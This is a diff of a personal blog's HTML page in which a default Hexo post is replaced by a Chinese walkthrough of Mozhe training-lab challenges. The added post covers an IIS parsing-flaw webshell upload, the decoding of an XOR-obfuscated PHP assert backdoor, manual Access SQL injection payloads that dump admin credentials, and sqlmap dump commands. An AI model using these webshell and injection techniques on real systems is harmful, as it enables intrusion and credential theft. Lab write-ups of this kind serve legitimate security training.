@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>Hello World · Ywc&#39;s blog</title>
+    <title>墨者学院平台修炼 · Ywc&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >Ywc&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">Hello World</a>
+                <a href="#" class="post-name">墨者学院平台修炼</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            Hello World
+            墨者学院平台修炼
             <!-- 404 -->
             
         </h1>
@@ -259,14 +259,20 @@ height:50vh;
             <div class="post-intros">
                 <!-- 文章页标签  -->
                 
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "learn">learn</a>
+    
+</div>
+                
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">74</span> / Reading time: <span class="post-count">1 min</span></span>
+                        <span>Word count: <span class="post-count">709</span> / Reading time: <span class="post-count">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/07/20</span>
+                    <span class="post-intro-time">2018/07/04</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -390,23 +396,45 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+        <p>网址：<a href="https://www.mozhe.cn" target="_blank" rel="noopener">https://www.mozhe.cn</a></p>
+<h2 id="iis文件解析漏洞"><a href="#iis文件解析漏洞" class="headerlink" title="iis文件解析漏洞"></a>iis文件解析漏洞</h2><p>总结：可看这篇<a href="https://yinwc.github.io/2018/07/02/iis%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">文章</a></p>
+<p>题目：<a href="https://www.mozhe.cn/bug/detail/Umc0Sm5NMnkzbHM0cFl2UlVRenA1UT09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/Umc0Sm5NMnkzbHM0cFl2UlVRenA1UT09bW96aGUmozhe</a></p>
+<p>第一步，点开链接，尝试上传txt文件，失败，尝试doc文件，失败，尝试jpg文件，成功<br>第二步，编写一句话木马文件，上传，用burp抓包，修改上传路径，将upload修改为test.asp<br>第三步，得到一个有解析漏洞的目录及包含一句话木马的路径 ，返回地址：test.asp/20186301829580.jpg<br>第四步，用菜刀连接，找到KEY文件，成功得到KEY！</p>
+<h2 id="PHP代码分析溯源"><a href="#PHP代码分析溯源" class="headerlink" title="PHP代码分析溯源"></a>PHP代码分析溯源</h2><p>题目地址：<a href="https://www.mozhe.cn/bug/detail/UW5xcFhsWE05akxJYjB1TzEyM2p3UT09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/UW5xcFhsWE05akxJYjB1TzEyM2p3UT09bW96aGUmozhe</a></p>
+<p>1、“^”为异或运算符。在PHP中，两个变量进行异或时，会将字符串转换成二进制再进行异或，异或完，又将结果从二进制转换成了字符串。</p>
+<p>2、$<em>++;这行代码的意思是对变量名为”</em>“的变量进行自增操作，在PHP中未定义的变量默认值为null,null==false==0,可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字。</p>
+<p>3、$__=(“<code>&quot;^&quot;?&quot;).(&quot;:&quot;^&quot;}&quot;).(&quot;%&quot;^&quot;</code>“).(“{“^”/“);<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="string">"`"</span>^<span class="string">"?"</span>)        <span class="number">01100000</span>^<span class="number">00111111</span>=<span class="number">01011111</span> —&gt;”_”</span><br><span class="line">(<span class="string">":"</span>^<span class="string">"&#125;"</span>)        <span class="number">00111010</span>^<span class="number">01111101</span>=<span class="number">01000111</span>—&gt;”G”</span><br><span class="line">(<span class="string">"%"</span>^<span class="string">"`"</span>)        <span class="number">00100101</span>^<span class="number">01100000</span>=<span class="number">01000101</span>—&gt;”E”</span><br><span class="line">(<span class="string">"&#123;"</span>^<span class="string">"/"</span>)        <span class="number">01111011</span>^ <span class="number">00101111</span>=<span class="number">01010100</span>—&gt;”T”</span><br></pre></td></tr></table></figure></p>
+<p>得到$__=_GET</p>
+<p>4、$___=(“$”^”{“).(“~”^”.”).(“/“^”`”).(“-“^”~”).(“(“^”|”);<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="string">"$"</span>^<span class="string">"&#123;"</span>)        <span class="number">00100100</span>^<span class="number">01111011</span>=<span class="number">01011111</span>—&gt;”_”</span><br><span class="line">(<span class="string">"~"</span>^<span class="string">"."</span>)        <span class="number">01111110</span>^<span class="number">00101110</span>=<span class="number">01010000</span>—&gt;”P”</span><br><span class="line">(<span class="string">"/"</span>^<span class="string">"`"</span>)        <span class="number">00101111</span>^<span class="number">01100000</span>=<span class="number">01001111</span>—&gt;”O”</span><br><span class="line">(<span class="string">"-"</span>^<span class="string">"~"</span>)        <span class="number">00101101</span>^<span class="number">01111110</span>=<span class="number">01010011</span>—&gt;”S”</span><br><span class="line">(<span class="string">"("</span>^<span class="string">"|"</span>)        <span class="number">00101000</span>^<span class="number">01111100</span>=<span class="number">01010100</span>—&gt;”T”</span><br></pre></td></tr></table></figure></p>
+<p>得到$___=_POST</p>
+<p>5、${$<strong>}[!$<em>](${$</em></strong>}[$_]);<br>得到$_GET<a href="$_POST[1]">0</a>;</p>
+<p>6、构造一句话木马，将“0”当成参数，赋值为“assert”</p>
+<p>7、使用菜刀工具连接，地址<a href="http://ip/b.php?0=assert" target="_blank" rel="noopener">http://ip/b.php?0=assert</a>  密码为1 </p>
+<h2 id="SQL手工注入漏洞测试-Access数据库"><a href="#SQL手工注入漏洞测试-Access数据库" class="headerlink" title="SQL手工注入漏洞测试(Access数据库)"></a>SQL手工注入漏洞测试(Access数据库)</h2><p>题目链接：<a href="https://www.mozhe.cn/bug/detail/VExmTm05OHhVM1dBeGdYdmhtbng5UT09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/VExmTm05OHhVM1dBeGdYdmhtbng5UT09bW96aGUmozhe</a></p>
+<p>注意是access数据库</p>
+<p>注意下面的链接,点开后发现url有asp?id=1,存在注入的可能。</p>
+<p>常规思路：</p>
+<p>1.找注入点：/new_list.asp?id=1 and 1=1 和and 1=2 检测是否存在注入，and 1=1 返回正常,若and 1=2 返回失败 确定有注入点。</p>
+<p>2.猜测表名：/new_list.asp?id=1  and exists(select * from 表名) 经猜测发现有admin</p>
+<p>3.猜测字段: /new_list.asp?id=1  union select 1 form admin ，猜测有多少字段，成功猜出有1、2、3、4字段。</p>
+<p>4.猜测字段名：/new_list.asp?id=1  and exists(select XXX from admin)，猜测有哪些字段名，成功猜出有id、username、passwd字段</p>
+<p>5.爆数据:   /new_list.asp?id=1 union select 1,username,passwd,4 from admin,爆出数据,如图</p>
+<p><img src="/2018/07/04/mozhe/1.png" alt="mozhe"></p>
+<h2 id="SQL注入实战MySQL"><a href="#SQL注入实战MySQL" class="headerlink" title="SQL注入实战MySQL"></a>SQL注入实战MySQL</h2><p>题目链接：<a href="https://www.mozhe.cn/bug/detail/MFZ4VjBxRnlIMHBUdGllRDJBMWtRZz09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/MFZ4VjBxRnlIMHBUdGllRDJBMWtRZz09bW96aGUmozhe</a></p>
+<h3 id="手工注入："><a href="#手工注入：" class="headerlink" title="手工注入："></a>手工注入：</h3><p><img src="/2018/07/04/mozhe/2.png" alt="mozhe"></p>
+<h3 id="Sqlmap跑"><a href="#Sqlmap跑" class="headerlink" title="Sqlmap跑"></a>Sqlmap跑</h3><p>1.列出数据库名<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">""</span> --dbs --tamper base64encode.py   <span class="comment">#(.py可加可不加)</span></span><br></pre></td></tr></table></figure></p>
+<p>2.列出test数据库下的表<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">""</span> --dbs --tamper base64encode.py -D test --tables</span><br></pre></td></tr></table></figure></p>
+<p>3.列出表data 下的列即字段<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">""</span> --dbs --tamper base64encode.py -D test -T data --columns</span><br></pre></td></tr></table></figure></p>
+<p>4.爆出字段内容<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">""</span> --dbs --tamper base64encode.py -D test -T data -C <span class="string">"id,main,thkey,title"</span> --dump</span><br></pre></td></tr></table></figure></p>
+<p>即可得到key.</p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="http://yoursite.com">John Doe</a>
-            <p>原文链接: <a href="http://yoursite.com/2018/07/20/hello-world/">http://yoursite.com/2018/07/20/hello-world/</a>
-            <p>发表日期: <a href="http://yoursite.com/2018/07/20/hello-world/">July 20th 2018, 4:29:31 pm</a>
+            <p>原文链接: <a href="http://yoursite.com/2018/07/04/mozhe/">http://yoursite.com/2018/07/04/mozhe/</a>
+            <p>发表日期: <a href="http://yoursite.com/2018/07/04/mozhe/">July 4th 2018, 10:51:21 am</a>
             <p>版权声明: </p>
         </div>
     
@@ -415,16 +443,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/07/21/blog/" title= 搭博客的经历 >
-                    <div class="nextTitle">搭博客的经历</div>
+                <a href= "/2018/07/04/java环境配置/" title= java环境配置及版本共存问题 >
+                    <div class="nextTitle">java环境配置及版本共存问题</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/07/12/渗透基础/" title= 渗透基础 >
-                    <div class="prevTitle">渗透基础</div>
+                <a href= "/2018/07/02/iis文件解析漏洞/" title= iis文件解析漏洞 >
+                    <div class="prevTitle">iis文件解析漏洞</div>
                 </a>
             
         </li>
@@ -536,7 +564,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Start"><span class="toc-number">1.</span> <span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-new-post"><span class="toc-number">1.1.</span> <span class="toc-text">Create a new post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Run-server"><span class="toc-number">1.2.</span> <span class="toc-text">Run server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generate-static-files"><span class="toc-number">1.3.</span> <span class="toc-text">Generate static files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploy-to-remote-sites"><span class="toc-number">1.4.</span> <span class="toc-text">Deploy to remote sites</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#iis文件解析漏洞"><span class="toc-number">1.</span> <span class="toc-text">iis文件解析漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP代码分析溯源"><span class="toc-number">2.</span> <span class="toc-text">PHP代码分析溯源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL手工注入漏洞测试-Access数据库"><span class="toc-number">3.</span> <span class="toc-text">SQL手工注入漏洞测试(Access数据库)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入实战MySQL"><span class="toc-number">4.</span> <span class="toc-text">SQL注入实战MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#手工注入："><span class="toc-number">4.1.</span> <span class="toc-text">手工注入：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sqlmap跑"><span class="toc-number">4.2.</span> <span class="toc-text">Sqlmap跑</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
